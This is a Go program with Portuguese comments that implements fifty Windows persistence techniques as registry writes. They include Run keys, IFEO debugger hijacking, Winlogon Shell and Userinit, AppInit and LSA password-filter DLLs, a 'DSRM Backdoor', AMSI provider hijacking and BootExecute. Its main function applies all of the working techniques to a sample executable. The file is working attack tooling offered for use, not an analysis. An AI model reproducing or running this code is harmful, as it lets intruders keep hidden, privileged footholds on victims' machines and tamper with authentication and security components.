package main

import (
	"fmt"
	"log"

	"golang.org/x/sys/windows/registry"
)

// ----------------------------------------------------
// Função auxiliar para definir um valor de string no registro
func setRegistryStringValue(root registry.Key, path, valueName, value string) error {
	k, _, err := registry.CreateKey(root, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()
	return k.SetStringValue(valueName, value)
}

// ----------------------------------------------------
// 1. Persistência via chave Run (HKLM)
func AddRunPersistenceHKLM(keyName, exePath string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, keyName, exePath)
}

// 2. Persistência via chave Run (HKCU)
func AddRunPersistenceHKCU(keyName, exePath string) error {
	return setRegistryStringValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, keyName, exePath)
}

// 3. Persistência via chave RunOnce (HKLM)
func AddRunOncePersistenceHKLM(keyName, exePath string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`, keyName, exePath)
}

// 4. Persistência via chave RunOnce (HKCU)
func AddRunOncePersistenceHKCU(keyName, exePath string) error {
	return setRegistryStringValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\RunOnce`, keyName, exePath)
}

// 5. Persistência via Image File Execution Options (IFEO)
// Redireciona a execução de um programa (por exemplo, "notepad.exe") para outro.
func AddIFEO(programName, debuggerValue string) error {
	path := fmt.Sprintf(`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, programName)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "Debugger", debuggerValue)
}

// 6. Persistência via NLDP DLL Override Path
func AddNLDPDllOverride(subKey, dllOverrideValue string) error {
	path := fmt.Sprintf(`SYSTEM\CurrentControlSet\Control\ContentIndex\Language\%s`, subKey)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "DLLPathOverride", dllOverrideValue)
}

// 7. Persistência via AEDebug (chave Debugger)
func SetAEDebugDebugger(debuggerValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`, "Debugger", debuggerValue)
}

// 8. Persistência via WerFault Hangs (chave Debugger)
func SetWerFaultHangsDebugger(debuggerValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs`, "Debugger", debuggerValue)
}

// 9. Persistência via Cmd AutoRun (HKLM)
func AddCmdAutoRunPersistenceHKLM(command string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Software\Microsoft\Command Processor`, "AutoRun", command)
}

// 10. Persistência via Cmd AutoRun (HKCU)
func AddCmdAutoRunPersistenceHKCU(command string) error {
	return setRegistryStringValue(registry.CURRENT_USER, `Software\Microsoft\Command Processor`, "AutoRun", command)
}

// 11. Persistência via Explorer Load
func SetExplorerLoad(loadValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Windows`, "Load", loadValue)
}

// 12. Persistência via Winlogon Userinit
func SetWinlogonUserinit(userinitValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`, "Userinit", userinitValue)
}

// 13. Persistência via Winlogon Shell
func SetWinlogonShell(shellValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`, "Shell", shellValue)
}

// 14. Persistência via AppCertDlls (usando uma entrada customizada)
func SetAppCertDlls(dllValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls`, "MyAppCert", dllValue)
}

// 15. Persistência via ServiceDll (para um serviço específico)
func SetServiceDll(serviceName, dllValue string) error {
	path := fmt.Sprintf(`SYSTEM\CurrentControlSet\Services\%s\Parameters`, serviceName)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "ServiceDll", dllValue)
}

// 16. Persistência via GPExtensionDlls (para uma extensão de política de grupo)
func SetGPExtensionDll(guid, dllValue string) error {
	path := fmt.Sprintf(`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions\%s`, guid)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "DllName", dllValue)
}

// 17. Persistência via Winlogon MPNotify
func SetWinlogonMPNotify(mpnotifyValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "mpnotify", mpnotifyValue)
}

// 18. Persistência via CHM Helper DLL
func SetCHMHelperDll(locationValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Software\Microsoft\HtmlHelp Author`, "Location", locationValue)
}

// 19. Persistência via HHCtrlHijacking (modifica hhctrl.ocx)
func SetHHCtrlHijacking(dllValue string) error {
	return setRegistryStringValue(registry.CLASSES_ROOT, `CLSID\{52A2AAAE-085D-4187-97EA-8C30DB990436}\InprocServer32`, "(Default)", dllValue)
}

// 20. Persistência via Startup Folder
// Esta técnica é baseada em arquivos (atalhos) na pasta Startup e não em registro.
func CreateStartupFolderShortcut(exePath string) error {
	return fmt.Errorf("CreateStartupFolderShortcut: Não implementado (baseado em arquivos e COM)")
}

// 21. Persistência via UserInitMprLogonScript (HKLM)
func AddUserInitMprLogonScriptHKLM(scriptValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Environment`, "UserInitMprLogonScript", scriptValue)
}

// 22. Persistência via UserInitMprLogonScript (HKCU)
func AddUserInitMprLogonScriptHKCU(scriptValue string) error {
	return setRegistryStringValue(registry.CURRENT_USER, `Environment`, "UserInitMprLogonScript", scriptValue)
}

// 23. Persistência via AutodialDLL (Winsock)
func SetAutodialDLL(dllValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\WinSock2\Parameters`, "AutodialDLL", dllValue)
}

// 24. Persistência via LSA Extensions DLL
func SetLSAExtensionsDLL(extensionsValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\LsaExtensionConfig\LsaSrv`, "Extensions", extensionsValue)
}

// 25. Persistência via ServerLevelPluginDll
func SetServerLevelPluginDll(dllValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\DNS\Parameters`, "ServerLevelPluginDll", dllValue)
}

// 26. Persistência via LSA Password Filter DLL
func SetLSAPasswordFilterDLL(dllValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, "Notification Packages", dllValue)
}

// 27. Persistência via LSA Authentication Packages
func SetLSAAuthenticationPackages(packagesValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, "Authentication Packages", packagesValue)
}

// 28. Persistência via LSA Security Packages
func SetLSASecurityPackages(packagesValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, "Security Packages", packagesValue)
}

// 29. Persistência via Winlogon Notification Packages
func SetWinlogonNotificationPackages(valueName, value string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify`, valueName, value)
}

// 30. Persistência via Explorer Tools (MyComputer)
func SetExplorerTools(subKey, exeValue string) error {
	path := fmt.Sprintf(`SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\%s`, subKey)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "(Default)", exeValue)
}

// 31. Persistência via .NET Debugger (DbgManagedDebugger para 64 e 32 bits)
func SetDotNetDebugger(debuggerValue string) error {
	err1 := setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\.NETFramework`, "DbgManagedDebugger", debuggerValue)
	err2 := setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Wow6432Node\Microsoft\.NETFramework`, "DbgManagedDebugger", debuggerValue)
	if err1 != nil {
		return err1
	}
	return err2
}

// 32. Persistência via RunEx (chave alternativa no HKLM)
func AddRunExPersistence(keyName, exePath string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\RunEx`, keyName, exePath)
}

// 33. Persistência via App Paths
func SetAppPath(appName, exePath string) error {
	path := fmt.Sprintf(`SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\%s`, appName)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "(Default)", exePath)
}

// 34. Persistência via Terminal Services InitialProgram (Política)
func SetTerminalServicesInitialProgramPolicy(programValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`, "InitialProgram", programValue)
}

// 35. Persistência via Terminal Services InitialProgram (WinStations)
func SetTerminalServicesInitialProgramWinStations(programValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`, "InitialProgram", programValue)
}

// 36. Persistência via AMSI Provider (definindo InprocServer32 para um determinado GUID)
func SetAMSIProvider(providerGUID, dllPath string) error {
	path := fmt.Sprintf(`SOFTWARE\Classes\CLSID\%s\InprocServer32`, providerGUID)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "(Default)", dllPath)
}

// 37. Persistência via Powershell Profiles (baseado em arquivos)
// Não é baseada em registro.
func SetPowershellProfile() error {
	return fmt.Errorf("SetPowershellProfile: Não implementado (baseado em arquivos)")
}

// 38. Persistência via Silent Process Exit Monitor
func SetSilentExitMonitor(subKey, monitorValue string) error {
	path := fmt.Sprintf(`SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\%s`, subKey)
	return setRegistryStringValue(registry.LOCAL_MACHINE, path, "MonitorProcess", monitorValue)
}

// 39. Persistência via Telemetry Controller Command
func SetTelemetryControllerCommand(commandValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController`, "Command", commandValue)
}

// 40. Persistência via RDP WDS Startup Programs
func SetRDPWDSStartupPrograms(programsValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd`, "StartupPrograms", programsValue)
}

// 41. Persistência via .NET Startup Hooks
func SetDotNetStartupHooks(hooksValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager\Environment`, "DOTNET_STARTUP_HOOKS", hooksValue)
}

// 42. Persistência via DSRM Backdoor
func SetDsrmBackdoor(dsrmValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `System\CurrentControlSet\Control\Lsa`, "DsrmAdminLogonBehavior", dsrmValue)
}

// 43. Persistência via GhostTask (tarefas agendadas via registro)
// Esta técnica envolve parsing complexo e não foi implementada aqui.
func SetGhostTask() error {
	return fmt.Errorf("SetGhostTask: Não implementado (requere parsing complexo de tarefas)")
}

// 44. Persistência via Boot Verification Program Hijacking
func SetBootVerificationProgramHijacking(imagePath string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\BootVerificationProgram`, "ImagePath", imagePath)
}

// 45. Persistência via AppInit DLLs (64-bit)
func SetAppInitDLLs(dllsValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Windows`, "AppInit_DLLs", dllsValue)
}

// 46. Persistência via AppInit DLLs (Wow6432Node)
func SetAppInitDLLsWow6432(dllsValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows`, "AppInit_DLLs", dllsValue)
}

// 47. Persistência via BootExecute
func SetBootExecute(commands string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager`, "BootExecute", commands)
}

// 48. Persistência via Netsh Helper DLL
func SetNetshHelperDLL(propertyName, dllValue string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\NetSh`, propertyName, dllValue)
}

// 49. Persistência via SetupExecute
func SetSetupExecute(commands string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager`, "SetupExecute", commands)
}

// 50. Persistência via PlatformExecute
func SetPlatformExecute(commands string) error {
	return setRegistryStringValue(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager`, "PlatformExecute", commands)
}

// ----------------------------------------------------
// Função principal – exemplos de uso de todas as técnicas de persistência.
func main() {
	// Exemplo de executável a ser persistido:
	exePath := `C:\teste\teste.exe`

	// 1. Run HKLM
	if err := AddRunPersistenceHKLM("MyRunHKLM", exePath); err != nil {
		log.Println("AddRunPersistenceHKLM error:", err)
	} else {
		fmt.Println("Persistência 'Run' HKLM configurada!")
	}

	// 2. Run HKCU
	if err := AddRunPersistenceHKCU("MyRunHKCU", exePath); err != nil {
		log.Println("AddRunPersistenceHKCU error:", err)
	} else {
		fmt.Println("Persistência 'Run' HKCU configurada!")
	}

	// 3. RunOnce HKLM
	if err := AddRunOncePersistenceHKLM("MyRunOnceHKLM", exePath); err != nil {
		log.Println("AddRunOncePersistenceHKLM error:", err)
	} else {
		fmt.Println("Persistência 'RunOnce' HKLM configurada!")
	}

	// 4. RunOnce HKCU
	if err := AddRunOncePersistenceHKCU("MyRunOnceHKCU", exePath); err != nil {
		log.Println("AddRunOncePersistenceHKCU error:", err)
	} else {
		fmt.Println("Persistência 'RunOnce' HKCU configurada!")
	}

	// 5. IFEO (redireciona notepad.exe para exePath)
	if err := AddIFEO("notepad.exe", exePath); err != nil {
		log.Println("AddIFEO error:", err)
	} else {
		fmt.Println("Persistência 'IFEO' configurada!")
	}

	// 6. NLDP DLL Override
	if err := AddNLDPDllOverride("Language1", exePath); err != nil {
		log.Println("AddNLDPDllOverride error:", err)
	} else {
		fmt.Println("Persistência 'NLDP DLL Override' configurada!")
	}

	// 7. AEDebug
	if err := SetAEDebugDebugger(exePath); err != nil {
		log.Println("SetAEDebugDebugger error:", err)
	} else {
		fmt.Println("Persistência 'AEDebug' configurada!")
	}

	// 8. WerFault Hangs
	if err := SetWerFaultHangsDebugger(exePath); err != nil {
		log.Println("SetWerFaultHangsDebugger error:", err)
	} else {
		fmt.Println("Persistência 'WerFault Hangs' configurada!")
	}

	// 9. Cmd AutoRun HKLM
	if err := AddCmdAutoRunPersistenceHKLM(exePath); err != nil {
		log.Println("AddCmdAutoRunPersistenceHKLM error:", err)
	} else {
		fmt.Println("Persistência 'Cmd AutoRun' HKLM configurada!")
	}

	// 10. Cmd AutoRun HKCU
	if err := AddCmdAutoRunPersistenceHKCU(exePath); err != nil {
		log.Println("AddCmdAutoRunPersistenceHKCU error:", err)
	} else {
		fmt.Println("Persistência 'Cmd AutoRun' HKCU configurada!")
	}

	// 11. Explorer Load
	if err := SetExplorerLoad(exePath); err != nil {
		log.Println("SetExplorerLoad error:", err)
	} else {
		fmt.Println("Persistência 'Explorer Load' configurada!")
	}

	// 12. Winlogon Userinit (atenção: concatena o valor padrão com o seu exe)
	if err := SetWinlogonUserinit(`C:\Windows\system32\userinit.exe,` + exePath); err != nil {
		log.Println("SetWinlogonUserinit error:", err)
	} else {
		fmt.Println("Persistência 'Winlogon Userinit' configurada!")
	}

	// 13. Winlogon Shell
	if err := SetWinlogonShell(exePath); err != nil {
		log.Println("SetWinlogonShell error:", err)
	} else {
		fmt.Println("Persistência 'Winlogon Shell' configurada!")
	}

	// 14. AppCertDlls
	if err := SetAppCertDlls(exePath); err != nil {
		log.Println("SetAppCertDlls error:", err)
	} else {
		fmt.Println("Persistência 'AppCertDlls' configurada!")
	}

	// 15. ServiceDll (exemplo para "MyService")
	if err := SetServiceDll("MyService", exePath); err != nil {
		log.Println("SetServiceDll error:", err)
	} else {
		fmt.Println("Persistência 'ServiceDll' configurada para MyService!")
	}

	// 16. GPExtensionDlls
	if err := SetGPExtensionDll("{GUID-EXAMPLE}", exePath); err != nil {
		log.Println("SetGPExtensionDll error:", err)
	} else {
		fmt.Println("Persistência 'GPExtensionDlls' configurada!")
	}

	// 17. Winlogon MPNotify
	if err := SetWinlogonMPNotify(exePath); err != nil {
		log.Println("SetWinlogonMPNotify error:", err)
	} else {
		fmt.Println("Persistência 'Winlogon MPNotify' configurada!")
	}

	// 18. CHM Helper DLL
	if err := SetCHMHelperDll(exePath); err != nil {
		log.Println("SetCHMHelperDll error:", err)
	} else {
		fmt.Println("Persistência 'CHM Helper DLL' configurada!")
	}

	// 19. HHCtrlHijacking
	if err := SetHHCtrlHijacking(exePath); err != nil {
		log.Println("SetHHCtrlHijacking error:", err)
	} else {
		fmt.Println("Persistência 'HHCtrlHijacking' configurada!")
	}

	// 20. Startup Folder – Não implementado
	if err := CreateStartupFolderShortcut(exePath); err != nil {
		log.Println(err)
	}

	// 21. UserInitMprLogonScript HKLM
	if err := AddUserInitMprLogonScriptHKLM(exePath); err != nil {
		log.Println("AddUserInitMprLogonScriptHKLM error:", err)
	} else {
		fmt.Println("Persistência 'UserInitMprLogonScript' HKLM configurada!")
	}

	// 22. UserInitMprLogonScript HKCU
	if err := AddUserInitMprLogonScriptHKCU(exePath); err != nil {
		log.Println("AddUserInitMprLogonScriptHKCU error:", err)
	} else {
		fmt.Println("Persistência 'UserInitMprLogonScript' HKCU configurada!")
	}

	// 23. AutodialDLL
	if err := SetAutodialDLL(exePath); err != nil {
		log.Println("SetAutodialDLL error:", err)
	} else {
		fmt.Println("Persistência 'AutodialDLL' configurada!")
	}

	// 24. LSA Extensions DLL
	if err := SetLSAExtensionsDLL(exePath); err != nil {
		log.Println("SetLSAExtensionsDLL error:", err)
	} else {
		fmt.Println("Persistência 'LSA Extensions DLL' configurada!")
	}

	// 25. ServerLevelPluginDll
	if err := SetServerLevelPluginDll(exePath); err != nil {
		log.Println("SetServerLevelPluginDll error:", err)
	} else {
		fmt.Println("Persistência 'ServerLevelPluginDll' configurada!")
	}

	// 26. LSA Password Filter DLL
	if err := SetLSAPasswordFilterDLL(exePath); err != nil {
		log.Println("SetLSAPasswordFilterDLL error:", err)
	} else {
		fmt.Println("Persistência 'LSA Password Filter DLL' configurada!")
	}

	// 27. LSA Authentication Packages
	if err := SetLSAAuthenticationPackages(exePath); err != nil {
		log.Println("SetLSAAuthenticationPackages error:", err)
	} else {
		fmt.Println("Persistência 'LSA Authentication Packages' configurada!")
	}

	// 28. LSA Security Packages
	if err := SetLSASecurityPackages(exePath); err != nil {
		log.Println("SetLSASecurityPackages error:", err)
	} else {
		fmt.Println("Persistência 'LSA Security Packages' configurada!")
	}

	// 29. Winlogon Notification Packages
	if err := SetWinlogonNotificationPackages("MyNotify", exePath); err != nil {
		log.Println("SetWinlogonNotificationPackages error:", err)
	} else {
		fmt.Println("Persistência 'Winlogon Notification Packages' configurada!")
	}

	// 30. Explorer Tools
	if err := SetExplorerTools("MyTool", exePath); err != nil {
		log.Println("SetExplorerTools error:", err)
	} else {
		fmt.Println("Persistência 'Explorer Tools' configurada!")
	}

	// 31. .NET Debugger
	if err := SetDotNetDebugger(exePath); err != nil {
		log.Println("SetDotNetDebugger error:", err)
	} else {
		fmt.Println("Persistência '.NET Debugger' configurada!")
	}

	// 32. RunEx Persistence
	if err := AddRunExPersistence("MyRunEx", exePath); err != nil {
		log.Println("AddRunExPersistence error:", err)
	} else {
		fmt.Println("Persistência 'RunEx' configurada!")
	}

	// 33. App Paths
	if err := SetAppPath("MyApp.exe", exePath); err != nil {
		log.Println("SetAppPath error:", err)
	} else {
		fmt.Println("Persistência 'App Paths' configurada!")
	}

	// 34. Terminal Services InitialProgram (Política)
	if err := SetTerminalServicesInitialProgramPolicy(exePath); err != nil {
		log.Println("SetTerminalServicesInitialProgramPolicy error:", err)
	} else {
		fmt.Println("Persistência 'Terminal Services InitialProgram (Política)' configurada!")
	}

	// 35. Terminal Services InitialProgram (WinStations)
	if err := SetTerminalServicesInitialProgramWinStations(exePath); err != nil {
		log.Println("SetTerminalServicesInitialProgramWinStations error:", err)
	} else {
		fmt.Println("Persistência 'Terminal Services InitialProgram (WinStations)' configurada!")
	}

	// 36. AMSI Provider
	if err := SetAMSIProvider("{GUID-EXAMPLE}", exePath); err != nil {
		log.Println("SetAMSIProvider error:", err)
	} else {
		fmt.Println("Persistência 'AMSI Provider' configurada!")
	}

	// 37. Powershell Profiles – Não implementado
	if err := SetPowershellProfile(); err != nil {
		log.Println(err)
	}

	// 38. Silent Exit Monitor
	if err := SetSilentExitMonitor("MySilentExit", exePath); err != nil {
		log.Println("SetSilentExitMonitor error:", err)
	} else {
		fmt.Println("Persistência 'Silent Exit Monitor' configurada!")
	}

	// 39. Telemetry Controller Command
	if err := SetTelemetryControllerCommand(exePath); err != nil {
		log.Println("SetTelemetryControllerCommand error:", err)
	} else {
		fmt.Println("Persistência 'Telemetry Controller Command' configurada!")
	}

	// 40. RDP WDS Startup Programs
	if err := SetRDPWDSStartupPrograms(exePath); err != nil {
		log.Println("SetRDPWDSStartupPrograms error:", err)
	} else {
		fmt.Println("Persistência 'RDP WDS Startup Programs' configurada!")
	}

	// 41. .NET Startup Hooks
	if err := SetDotNetStartupHooks(exePath); err != nil {
		log.Println("SetDotNetStartupHooks error:", err)
	} else {
		fmt.Println("Persistência '.NET Startup Hooks' configurada!")
	}

	// 42. DSRM Backdoor
	if err := SetDsrmBackdoor(exePath); err != nil {
		log.Println("SetDsrmBackdoor error:", err)
	} else {
		fmt.Println("Persistência 'DSRM Backdoor' configurada!")
	}

	// 43. GhostTask – Não implementado
	if err := SetGhostTask(); err != nil {
		log.Println(err)
	}

	// 44. Boot Verification Program Hijacking
	if err := SetBootVerificationProgramHijacking(exePath); err != nil {
		log.Println("SetBootVerificationProgramHijacking error:", err)
	} else {
		fmt.Println("Persistência 'Boot Verification Program Hijacking' configurada!")
	}

	// 45. AppInit DLLs (64-bit)
	if err := SetAppInitDLLs(exePath); err != nil {
		log.Println("SetAppInitDLLs error:", err)
	} else {
		fmt.Println("Persistência 'AppInit DLLs' (64-bit) configurada!")
	}

	// 46. AppInit DLLs (Wow6432Node)
	if err := SetAppInitDLLsWow6432(exePath); err != nil {
		log.Println("SetAppInitDLLsWow6432 error:", err)
	} else {
		fmt.Println("Persistência 'AppInit DLLs' (Wow6432Node) configurada!")
	}

	// 47. BootExecute
	if err := SetBootExecute(exePath); err != nil {
		log.Println("SetBootExecute error:", err)
	} else {
		fmt.Println("Persistência 'BootExecute' configurada!")
	}

	// 48. Netsh Helper DLL
	if err := SetNetshHelperDLL("MyNetsh", exePath); err != nil {
		log.Println("SetNetshHelperDLL error:", err)
	} else {
		fmt.Println("Persistência 'Netsh Helper DLL' configurada!")
	}

	// 49. SetupExecute
	if err := SetSetupExecute(exePath); err != nil {
		log.Println("SetSetupExecute error:", err)
	} else {
		fmt.Println("Persistência 'SetupExecute' configurada!")
	}

	// 50. PlatformExecute
	if err := SetPlatformExecute(exePath); err != nil {
		log.Println("SetPlatformExecute error:", err)
	} else {
		fmt.Println("Persistência 'PlatformExecute' configurada!")
	}

	fmt.Println("Todas as funções de persistência foram executadas (ou tentadas).")
}
